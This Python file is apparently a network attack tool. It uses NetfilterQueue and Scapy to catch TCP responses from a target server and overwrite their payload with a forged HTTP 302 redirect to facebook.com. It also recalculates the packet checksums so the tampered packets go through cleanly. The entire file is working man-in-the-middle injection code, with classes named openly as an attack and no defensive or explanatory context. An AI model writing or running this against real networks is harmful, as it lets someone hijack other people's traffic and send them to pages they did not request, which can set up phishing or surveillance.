from netfilterqueue import NetfilterQueue
from netfilterqueue import Packet
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

class NetworkListenerPacketModifier:
    def __init__(self, target_server: str):
        self.target_server = target_server
        self.packet_count = 0

    def packet_handler(self, packet: Packet):
        self.packet_count += 1
        raw_payload = packet.get_payload()
        scapy_packet = IP(raw_payload)

        # condition for matching the server response
        if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw):
            server_tcp_layer = scapy_packet.getlayer(IP)
            if server_tcp_layer.src == self.target_server:
                print("[*] Detected server response... Intercepting...")
                print("Sample Payload:")
                scapy_packet.show()

                # modified tampered network content
                scapy_packet[Raw].load = (
                    b"HTTP/1.1 302 Found\r\n"
                    b"Date: Sun, 14 Jun 2026 12:43:45 GMT\r\n"
                    b"Server: Apache/2.4.41 (Ubuntu)\r\n"
                    b"Location: https://www.facebook.com/\r\n"
                    b"Content-Length: 0\r\n"
                    b"Connection: close\r\n"
                    b"\r\n"
                )

                # delete the ip length and tcp checksums for scapy to recalculate
                # this avoids us from having corrupted tcp packets
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                # scapy modified contents to the packet
                packet.set_payload(bytes(scapy_packet))

        packet.accept()


class NetworkRedirectAttack:
    def __init__(self, target_ip: str, target_server: str):
        self.netfilter = NetfilterQueue()
        self.target_ip = target_ip
        self.target_server = target_server

    def execute(self):
        try:
            print("[*] Starting network redirect listener...")
            network_listener = NetworkListenerPacketModifier(
                target_server=self.target_server
            )

            self.netfilter.bind(1, network_listener.packet_handler)
            self.netfilter.run()
        except KeyboardInterrupt:
            print("[*] Unbinding queue...")
            self.netfilter.unbind()
